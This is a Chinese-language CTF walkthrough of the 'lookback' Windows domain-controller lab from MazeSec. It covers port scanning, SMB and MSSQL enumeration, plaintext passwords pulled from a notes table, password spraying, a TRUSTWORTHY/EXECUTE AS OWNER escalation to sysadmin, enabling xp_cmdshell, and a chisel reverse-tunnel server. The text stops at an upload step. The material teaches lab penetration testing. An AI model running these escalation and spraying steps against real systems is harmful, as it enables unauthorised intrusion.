---
title: MazeSec-lookback
description: 'QQ Group Virtual Machine'
pubDate: 2026-04-10
image: /image/fengmian/QQ.png
categories:
  - Documentation
tags:
  - MazeSec
  - Windows Machine
---

# 靶机信息
## 详情
> 靶机：lookback 
>
> 作者：wackymaker (QQ: 3456458902) 
>
> 靶机ID: 632 
>
> 系统：Windows（ad） 
>
> 难度：hard 
>
> 链接：<u>https://mega.nz/file/GxgggYIR#T4gVR6wA9A3zy7r9qzo0gzxAzgIHI-_yURnsng-4tNw</u> 
>
> 链接：<u>https://pan.baidu.com/s/1fpP1MyMAyyxe1hLrBG_LGg?pwd=7qgb</u> 
>
> 初始凭证：hank\HrUhoX2r6c7Jgxg2qiTY
>

## 启动（失败）
![](/image/qq%20group/lookback-1.png)

## 配置
> 1. 彻底关机 `**lookback**`
> 2. 在 `**Storage**` 里只做删除，不做新增
> 3. 找到 `**NVMe Controller**` 下的 `**lookback-disk1.vdi**`
> 4. 点“Remove Attachment”
> 5. 保存
> 6. 重新打开设置，确认 `**NVMe**` 下已经空了
> 7. 再把这块盘添加到 `**SATA Controller -> Port 0**`
>

![](/image/qq%20group/lookback-2.png)

## IP地址
```c
┌──(web)─(root㉿kali)-[/home/…/Desktop/hmv/lookback/myself]
└─# arp-scan --interface=eth1 --localnet | grep "08:00:27"  
172.16.55.128   08:00:27:2f:a0:3b       PCS Systemtechnik GmbH
```

# 信息收集
## rustscan
```c
┌──(web)─(root㉿kali)-[/home/…/Desktop/hmv/lookback/myself]
└─# rustscan -a 172.16.55.128 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Where '404 Not Found' meets '200 OK'.

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 172.16.55.128:445
Open 172.16.55.128:1433
```

## 同步时间
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# nmap -p 445 --script smb2-time 172.16.55.128
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-11 13:40 +0800
Nmap scan report for dc01.lookback.htb (172.16.55.128)
Host is up (0.00027s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:2F:A0:3B (Oracle VirtualBox virtual NIC)

Host script results:
| smb2-time: 
|   date: 2026-04-11T06:01:38
|_  start_date: N/A

Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
```

```plain
sudo timedatectl set-timezone UTC
sudo date -s "2026-04-11 06:01:38"
```

## enum4linux-ng
```c
┌──(web)─(root㉿kali)-[/home/…/Desktop/hmv/lookback/myself]
└─# rustscan -a 172.16.55.128 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Where '404 Not Found' meets '200 OK'.

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 172.16.55.128:445
Open 172.16.55.128:1433
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A" on ip 172.16.55.128
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-11 11:47 +0800
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:47
Completed NSE at 11:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:47
Completed NSE at 11:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:47
Completed NSE at 11:47, 0.00s elapsed
Initiating ARP Ping Scan at 11:47
Scanning 172.16.55.128 [1 port]
Completed ARP Ping Scan at 11:47, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:47
Completed Parallel DNS resolution of 1 host. at 11:47, 4.50s elapsed
DNS resolution of 1 IPs took 4.50s. Mode: Async [#: 3, OK: 0, NX: 0, DR: 1, SF: 0, TR: 6, CN: 0]
Initiating SYN Stealth Scan at 11:47
Scanning 172.16.55.128 [2 ports]
Discovered open port 445/tcp on 172.16.55.128
Discovered open port 1433/tcp on 172.16.55.128
Completed SYN Stealth Scan at 11:47, 0.01s elapsed (2 total ports)
Initiating Service scan at 11:47
Scanning 2 services on 172.16.55.128
Completed Service scan at 11:47, 6.02s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 172.16.55.128
Retrying OS detection (try #2) against 172.16.55.128
NSE: Script scanning 172.16.55.128.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:48
NSE Timing: About 99.65% done; ETC: 11:48 (0:00:00 remaining)
Completed NSE at 11:48, 40.04s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:48
Completed NSE at 11:48, 0.05s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:48
Completed NSE at 11:48, 0.00s elapsed
Nmap scan report for 172.16.55.128
Host is up, received arp-response (0.00036s latency).
Scanned at 2026-04-11 11:47:53 CST for 50s

PORT     STATE SERVICE       REASON          VERSION
445/tcp  open  microsoft-ds? syn-ack ttl 128
1433/tcp open  ms-sql-s      syn-ack ttl 128 Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   172.16.55.128:1433: 
|     Target_Name: LOOKBACK
|     NetBIOS_Domain_Name: LOOKBACK
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: lookback.htb
|     DNS_Computer_Name: dc01.lookback.htb
|     DNS_Tree_Name: lookback.htb
|_    Product_Version: 10.0.20348
|_ssl-date: 2026-04-11T03:57:19+00:00; +8m36s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-11T03:52:01
| Not valid after:  2056-04-11T03:52:01
| MD5:     7474 440a 16ce 3fac dfe7 9c40 1237 c0fc
| SHA-1:   98b5 8200 df9f cf7c c7fa 7481 62b8 895c b5b8 4634
| SHA-256: 258a 88d1 3b16 1c42 a05e c7d7 ea41 b3da fee5 7ee2 cc7d dcb6 ee04 ae2f 5885 8c54
| -----BEGIN CERTIFICATE-----
| MIIEADCCAmigAwIBAgIQGm3HGZvOj5VCSzUQsQ5msDANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjYwNDExMDM1MjAxWhgPMjA1NjA0MTEwMzUyMDFaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBAPUHgbuD
| bBc5qBelr4X1WCI1KsW3GRBACa60P5AzaQwfTr2h0IdYNvurfgAmQtyvXjaPoJIT
| CJ4ssEQRJZ0wf6m7xsphUyBV3G2yPFNtYb7aPXv7qhKO4imjbeGVT638HZLYFMgs
| CTIsqIpP+910po23zNwZsEB6Y/vhAtx4aswg4RHV0SpB6dEVwNElsCEuQ5rFnZAu
| m3hRa/+lYCQHadfwEVG25RRWMSywSAz6hJ/4OlkWcXO15M4sZUefQWM5VE/xKeUc
| yVhEv2G7xTwnJ5vqWyxz+IvnibUc6WRUqZwQof1fyjey2fPGIAC/V27pNrnPvl1a
| mOUdZpVwI3Lt0CBvDMAIGKQoBnc4jtuBLde4JRtDuFJHTp+0H1MRypV1bFF6wfcW
| byu/mxmTNfQdPPct11lCEF22kWtmf/AVtW92N89uBlv46xiBoeepYjTyVFmGNBtm
| vdl4zopzGp0hF9lKaxDDGPJ/RBvE/bBlr/XgoEhkAZsNgmCGSIeSH0COLQIDAQAB
| MA0GCSqGSIb3DQEBCwUAA4IBgQCWBFp9iElHXo55braQc+d4qgg9qb773LOcW96R
| WUoKFRn+L5xH8pCSx1CS8iTs3aUa0S5xwtoCsRXGZIVSXqbaqBfyQSgtm3fJuGPH
| dPYz6h2P7KFJUOxBgdiH/xhL/7w8TTdq4x6X4V9q6gqXOEL33+ygV4lupiKCqXWh
| zfgOiXADf+1fwN6Kq3E6mkwA03K3s9bcAsu7GfmiKHx0nBIuNZMa2wup4rHp+kyT
| e5UNbvhtTn5nnbzWZgVoTJWxDTZgxqdh9o8pZquH0s5PH48Ze2qVZjavd3hyEX09
| I0I3O4kWqNqz8jhLM53OHR+fz1FHfLRfFSmAYPloFYZAw7/bTn6ERZNjBvRoRm7J
| M5E6WzdXd2AwFGUmcYdtdN2pW9T+0ki55L9qDOAcLCUMfYqEl2Au55IhNyyWJNgX
| leMTjln6ZLV/Yej/GieHtUlU5Q18hMHmzoMD3I68ig6BhmZVBtrlF028Pp67/z/z
| rqikA3uC/zht8YXVSceyw/EVr0Q=
|_-----END CERTIFICATE-----
| ms-sql-info: 
|   172.16.55.128:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
MAC Address: 08:00:27:2F:A0:3B (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|11|2016 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2016
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2022 (92%), Microsoft Windows 11 21H2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.98%E=4%D=4/11%OT=445%CT=%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=69D9C49B%P=x86_64-pc-linux-gnu)
SEQ(SP=F3%GCD=1%ISR=FB%TI=I%TS=A)
SEQ(SP=FF%GCD=1%ISR=10C%TI=I%TS=A)
OPS(O1=M5B4NW8ST11%O2=M5B4NW8ST11%O3=M5B4NW8NNT11%O4=M5B4NW8ST11%O5=M5B4NW8ST11%O6=M5B4ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M5B4NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=N)

Uptime guess: 0.005 days (since Sat Apr 11 11:41:08 2026)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=243 (Good luck!)
IP ID Sequence Generation: Incremental

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 20036/tcp): CLEAN (Timeout)
|   Check 2 (port 63241/tcp): CLEAN (Timeout)
|   Check 3 (port 42841/udp): CLEAN (Timeout)
|   Check 4 (port 42527/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-11T03:56:38
|_  start_date: N/A
|_clock-skew: mean: 8m32s, deviation: 2s, median: 8m31s

TRACEROUTE
HOP RTT     ADDRESS
1   0.36 ms 172.16.55.128

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:48
Completed NSE at 11:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:48
Completed NSE at 11:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:48
Completed NSE at 11:48, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.53 seconds
           Raw packets sent: 89 (9.036KB) | Rcvd: 17 (932B)
```

## 添加hosts
```c
┌──(web)─(root㉿kali)-[/home/…/Desktop/hmv/lookback/myself]
└─# echo "172.16.55.128 dc01.lookback.htb lookback.htb dc01" | sudo tee -a /etc/hosts 
172.16.55.128 dc01.lookback.htb lookback.htb dc01
```

## netexec
### smb(shares)
```c
┌──(web)─(root㉿kali)-[/home/…/Desktop/hmv/lookback/myself]
└─# nxc smb 172.16.55.128 -d lookback.htb -u hank -p 'HrUhoX2r6c7Jgxg2qiTY' --shares
SMB         172.16.55.128   445    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:lookback.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.55.128   445    DC01             [+] lookback.htb\hank:HrUhoX2r6c7Jgxg2qiTY 
SMB         172.16.55.128   445    DC01             [*] Enumerated shares
SMB         172.16.55.128   445    DC01             Share           Permissions     Remark
SMB         172.16.55.128   445    DC01             -----           -----------     ------
SMB         172.16.55.128   445    DC01             ADMIN$                          Remote Admin
SMB         172.16.55.128   445    DC01             C$                              Default share
SMB         172.16.55.128   445    DC01             IPC$            READ            Remote IPC
SMB         172.16.55.128   445    DC01             NETLOGON        READ            Logon server share 
SMB         172.16.55.128   445    DC01             notes                           
SMB         172.16.55.128   445    DC01             SYSVOL          READ            Logon server share
```

### smb(users)
```c
┌──(web)─(root㉿kali)-[/home/…/Desktop/hmv/lookback/myself]
└─# nxc smb 172.16.55.128 -d lookback.htb -u hank -p 'HrUhoX2r6c7Jgxg2qiTY' --users
SMB         172.16.55.128   445    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:lookback.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.55.128   445    DC01             [+] lookback.htb\hank:HrUhoX2r6c7Jgxg2qiTY 
SMB         172.16.55.128   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         172.16.55.128   445    DC01             Administrator                 2025-10-17 18:08:02 0       Built-in account for administering the computer/domain
SMB         172.16.55.128   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         172.16.55.128   445    DC01             krbtgt                        2025-10-17 03:15:35 0       Key Distribution Center Service Account
SMB         172.16.55.128   445    DC01             hank                          2025-10-19 12:05:12 0 
SMB         172.16.55.128   445    DC01             lookback-admin                2025-10-19 12:11:25 0 
SMB         172.16.55.128   445    DC01             db-admin                      2025-10-19 12:15:44 0 
SMB         172.16.55.128   445    DC01             Service_Maintainer            2025-10-19 13:27:26 0 
SMB         172.16.55.128   445    DC01             IT-SEC-admin                  2025-10-19 14:11:48 0 
SMB         172.16.55.128   445    DC01             IT-admin                      2025-10-19 14:15:17 0 
SMB         172.16.55.128   445    DC01             IT-login-user                 2025-10-19 14:17:16 0 
SMB         172.16.55.128   445    DC01             IT-email-admin                2025-10-19 14:20:21 0 
SMB         172.16.55.128   445    DC01             [*] Enumerated 11 local users: LOOKBACK
```

### mssql
```c
┌──(web)─(root㉿kali)-[/home/…/Desktop/hmv/lookback/myself]
└─# nxc mssql 172.16.55.128 -d lookback.htb -u hank -p 'HrUhoX2r6c7Jgxg2qiTY'
MSSQL       172.16.55.128   1433   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:lookback.htb) (EncryptionReq:False)
MSSQL       172.16.55.128   1433   DC01             [+] lookback.htb\hank:HrUhoX2r6c7Jgxg2qiTY 
```

# Mssql-1433
## 连接(hank)
```c
┌──(web)─(root㉿kali)-[/home/…/Desktop/hmv/lookback/myself]
└─# impacket-mssqlclient 'lookback.htb/hank:HrUhoX2r6c7Jgxg2qiTY@172.16.55.128' -windows-auth
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(dc01): Line 1: Changed database context to 'master'.
[*] INFO(dc01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (lookback\hank  guest@master)>
```

## 信息收集
### enum-db
```c
SQL (lookback\hank  guest@master)> enum_db
name       is_trustworthy_on   
--------   -----------------   
master                     0   
tempdb                     0   
model                      0   
msdb                       1   
lookback                   1   
notes                      0   
```

### enum_logins
```c
SQL (lookback\hank  guest@master)> enum_logins
name            type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
-------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa              SQL_LOGIN                 0          1               0             0            0              0           0           0           0   
lookback\hank   WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
```

### 权限查询
```c
SQL (lookback\hank  guest@master)> SELECT SYSTEM_USER;
                
-------------   
lookback\hank
```

```c
SQL (lookback\hank  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
0 
```

```c
SQL (lookback\hank  guest@master)> SELECT * FROM fn_my_permissions(NULL, 'SERVER');
entity_name   subentity_name   permission_name     
-----------   --------------   -----------------   
server                         CONNECT SQL         
server                         VIEW ANY DATABASE       
```

```c
SQL (lookback\hank  guest@master)> SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
entity_name   subentity_name   permission_name                             
-----------   --------------   -----------------------------------------   
database                       CONNECT                                     
database                       VIEW ANY COLUMN ENCRYPTION KEY DEFINITION   
database                       VIEW ANY COLUMN MASTER KEY DEFINITION 
```

### Note数据库
> 尝试密码喷洒都失败了
>
> 经与前文smb(users)的比对确定lookback_admin应为lookback-admin
>

```c
SQL (lookback\hank  LOOKBACK\hank@notes)> SELECT name FROM sys.tables;
name          
-----------   
users_notes   
SQL (lookback\hank  LOOKBACK\hank@notes)> SELECT * FROM notes.dbo.users_notes;
id   username            password                                                                         
--   -----------------   ------------------------------------------------------------------------------   
 1   Update Notice       Due to multiple weak passwords, strong password accounts are now being issued.   
 2   jacob               G4vK1sZq9pH7tR2L                                                                 
 3   www_data            Q8mP2cV7xN3yJ5S0                                                                 
 4   Administrator       Z2pL6wF9rT5bC3K1                                                                 
 5   mssqlsvc            H5kR3nV8qW1tM7X2                                                                 
 6   signed_IT           U7qF2bY9mC4pL1T6                                                                 
 7   wack_admin          N6vT4pR8sK1qZ3H0                                                                 
 8   lan                 P3rM9tW2kV7xL5C1                                                                 
 9   user_roundcube      F8kJ2vN6qR4pT1Z3                                                                 
10   user                Y1pL7nK3vR9tC5M2                                                                 
11   stow_svc            D4qV8mP2rT6kN1S9                                                                 
12   ch_user             L9rT3pF6vK1nM8Q2                                                                 
13   rustkey             C2pN7qR5vT9kL3H1                                                                 
14   outbound_user       S6kP1vR9tM4qN2Z8                                                                 
15   lookback_migrator   B7qR2pT6vN1kM9C4                                                                 
16   lookback_admin      iPmmhn8bguFcWin9   
```

```c
┌──(web)─(root㉿kali)-[/home/…/Desktop/hmv/lookback/myself]
└─# nxc smb 172.16.55.128 -d lookback.htb -u lookback-admin -p 'iPmmhn8bguFcWin9'

SMB         172.16.55.128   445    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:lookback.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.55.128   445    DC01             [+] lookback.htb\lookback-admin:iPmmhn8bguFcWin9 
                                                                                                        
┌──(web)─(root㉿kali)-[/home/…/Desktop/hmv/lookback/myself]
└─# nxc mssql 172.16.55.128 -d lookback.htb -u lookback-admin -p 'iPmmhn8bguFcWin9'
MSSQL       172.16.55.128   1433   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:lookback.htb) (EncryptionReq:False)
MSSQL       172.16.55.128   1433   DC01             [+] lookback.htb\lookback-admin:iPmmhn8bguFcWin9 
```

#### users.txt
```plain
jacob
www_data
Administrator
mssqlsvc
signed_IT
wack_admin
lan
user_roundcube
user
stow_svc
ch_user
rustkey
outbound_user
lookback_migrator
lookback_admin
```

#### passwords.txt
```plain
G4vK1sZq9pH7tR2L
Q8mP2cV7xN3yJ5S0
Z2pL6wF9rT5bC3K1
H5kR3nV8qW1tM7X2
U7qF2bY9mC4pL1T6
N6vT4pR8sK1qZ3H0
P3rM9tW2kV7xL5C1
F8kJ2vN6qR4pT1Z3
Y1pL7nK3vR9tC5M2
D4qV8mP2rT6kN1S9
L9rT3pF6vK1nM8Q2
C2pN7qR5vT9kL3H1
S6kP1vR9tM4qN2Z8
B7qR2pT6vN1kM9C4
iPmmhn8bguFcWin9
```

### netexec-密码喷洒
```c
┌──(web)─(root㉿kali)-[/home/…/Desktop/hmv/lookback/myself]
└─# nxc smb 172.16.55.128 -d lookback.htb -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
SMB         172.16.55.128   445    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:lookback.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.55.128   445    DC01             [-] lookback.htb\jacob:G4vK1sZq9pH7tR2L STATUS_LOGON_FAILURE
SMB         172.16.55.128   445    DC01             [-] lookback.htb\www_data:Q8mP2cV7xN3yJ5S0 STATUS_LOGON_FAILURE
SMB         172.16.55.128   445    DC01             [-] lookback.htb\Administrator:Z2pL6wF9rT5bC3K1 STATUS_LOGON_FAILURE
SMB         172.16.55.128   445    DC01             [-] lookback.htb\mssqlsvc:H5kR3nV8qW1tM7X2 STATUS_LOGON_FAILURE
SMB         172.16.55.128   445    DC01             [-] lookback.htb\signed_IT:U7qF2bY9mC4pL1T6 STATUS_LOGON_FAILURE
SMB         172.16.55.128   445    DC01             [-] lookback.htb\wack_admin:N6vT4pR8sK1qZ3H0 STATUS_LOGON_FAILURE
SMB         172.16.55.128   445    DC01             [-] lookback.htb\lan:P3rM9tW2kV7xL5C1 STATUS_LOGON_FAILURE
SMB         172.16.55.128   445    DC01             [-] lookback.htb\user_roundcube:F8kJ2vN6qR4pT1Z3 STATUS_LOGON_FAILURE
SMB         172.16.55.128   445    DC01             [-] lookback.htb\user:Y1pL7nK3vR9tC5M2 STATUS_LOGON_FAILURE
SMB         172.16.55.128   445    DC01             [-] lookback.htb\stow_svc:D4qV8mP2rT6kN1S9 STATUS_LOGON_FAILURE
SMB         172.16.55.128   445    DC01             [-] lookback.htb\ch_user:L9rT3pF6vK1nM8Q2 STATUS_LOGON_FAILURE
SMB         172.16.55.128   445    DC01             [-] lookback.htb\rustkey:C2pN7qR5vT9kL3H1 STATUS_LOGON_FAILURE
SMB         172.16.55.128   445    DC01             [-] lookback.htb\outbound_user:S6kP1vR9tM4qN2Z8 STATUS_LOGON_FAILURE
SMB         172.16.55.128   445    DC01             [-] lookback.htb\lookback_migrator:B7qR2pT6vN1kM9C4 STATUS_LOGON_FAILURE
SMB         172.16.55.128   445    DC01             [-] lookback.htb\lookback_admin:iPmmhn8bguFcWin9 STATUS_LOGON_FAILURE
```

```c
┌──(web)─(root㉿kali)-[/home/…/Desktop/hmv/lookback/myself]
└─# nxc smb 172.16.55.128 -d lookback.htb -u lookback-admin -p 'iPmmhn8bguFcWin9'

SMB         172.16.55.128   445    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:lookback.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.55.128   445    DC01             [+] lookback.htb\lookback-admin:iPmmhn8bguFcWin9 
                                                                                                        
┌──(web)─(root㉿kali)-[/home/…/Desktop/hmv/lookback/myself]
└─# nxc mssql 172.16.55.128 -d lookback.htb -u lookback-admin -p 'iPmmhn8bguFcWin9'
MSSQL       172.16.55.128   1433   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:lookback.htb) (EncryptionReq:False)
MSSQL       172.16.55.128   1433   DC01             [+] lookback.htb\lookback-admin:iPmmhn8bguFcWin9 
```

## 连接(lookback-admin)
```c
┌──(web)─(root㉿kali)-[/home/…/Desktop/hmv/lookback/myself]
└─# impacket-mssqlclient 'lookback.htb/lookback-admin:iPmmhn8bguFcWin9@172.16.55.128' -windows-auth
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(dc01): Line 1: Changed database context to 'master'.
[*] INFO(dc01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (lookback\lookback-admin  guest@master)>
```

## 信息收集
### enum-db
```c
SQL (lookback\lookback-admin  guest@master)> enum_db
name       is_trustworthy_on   
--------   -----------------   
master                     0   
tempdb                     0   
model                      0   
msdb                       1   
lookback                   1   
notes                      0   
```

### enum_logins
```c
SQL (lookback\lookback-admin  guest@master)> enum_logins
name                      type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
-----------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa                        SQL_LOGIN                 0          1               0             0            0              0           0           0           0   
lookback\lookback-admin   WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
```

### 权限查询
```c
SQL (lookback\lookback-admin  guest@master)> SELECT SYSTEM_USER;
                          
-----------------------   
lookback\lookback-admin   
```

```c
SQL (lookback\lookback-admin  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
0   
```

```c
SQL (lookback\lookback-admin  guest@master)> SELECT * FROM fn_my_permissions(NULL, 'SERVER');
entity_name   subentity_name   permission_name     
-----------   --------------   -----------------   
server                         CONNECT SQL         
server                         VIEW ANY DATABASE   
```

```c
SQL (lookback\lookback-admin  guest@master)> SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
entity_name   subentity_name   permission_name                             
-----------   --------------   -----------------------------------------   
database                       CONNECT                                     
database                       VIEW ANY COLUMN ENCRYPTION KEY DEFINITION   
database                       VIEW ANY COLUMN MASTER KEY DEFINITION     
```

## 权限提升
### 前置条件
#### `EXECUTE AS OWNER` 提权
> **TRUSTWORTHY** 属性允许数据库内的模拟（Impersonation）上下文跨越数据库边界。  
结合另一个条件：如果数据库的所有者是高权限登录名（比如 `sa`），那么在该数据库内创建一个 `EXECUTE AS OWNER` 的存储过程，执行时就会**以 **`**sa**`** 的权限级别运行**
>

```c
enum_db  --> lookback 数据库 is_trustworthy_on = 1
```

#### 数据库所有者
```c
SQL (lookback\hank  guest@msdb)> SELECT name, SUSER_SNAME(owner_sid) AS owner FROM sys.databases WHERE name = 'lookback';
name       owner                    
--------   ----------------------   
lookback   LOOKBACK\Administrator  
```

### exploit
#### 步骤 1：进入 `lookback` 数据库
```c
SQL (lookback\lookback-admin  guest@master)> USE lookback;
ENVCHANGE(DATABASE): Old Value: master, New Value: lookback
INFO(dc01): Line 1: Changed database context to 'lookback'.
```

#### 步骤 2：创建提权存储过程
```plain
SQL (lookback\lookback-admin  lookback\lookback-admin@lookback)> CREATE OR ALTER PROCEDURE dbo.privesc WITH EXECUTE AS OWNER AS BEGIN ALTER SERVER ROLE [sysadmin] ADD MEMBER [LOOKBACK\lookback-admin]; END;
```

#### 步骤 3：执行存储过程
```plain
SQL (lookback\lookback-admin  lookback\lookback-admin@lookback)> EXEC dbo.privesc;
```

#### 步骤 4：验证是否成功
```plain
SQL (lookback\lookback-admin  dbo@lookback)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
1  
```

若返回 `1`，则说明已成功加入 `sysadmin` 角色。

#### 步骤 5：启用 `xp_cmdshell` 并执行命令
```plain
SQL (lookback\lookback-admin  dbo@lookback)> EXEC sp_configure 'show advanced options', 1;
INFO(dc01): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (lookback\lookback-admin  dbo@lookback)> RECONFIGURE;
SQL (lookback\lookback-admin  dbo@lookback)> EXEC sp_configure 'xp_cmdshell', 1;
INFO(dc01): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (lookback\lookback-admin  dbo@lookback)> RECONFIGURE;
SQL (lookback\lookback-admin  dbo@lookback)> EXEC xp_cmdshell 'whoami';
output              
-----------------   
lookback\db-admin   
NULL     
```

## 建立隧道
> 需要将域内端口转发出来
>

### Kali
> 尝试了下其它端口发现没有回连
>

```bash
/usr/bin/chisel server --reverse --socks5 -p 445 -v
```

### MSSQL
#### upload
```sql
┌──(web)─(root㉿kali)-[/home/…/Desktop/hmv/lookback/myself]
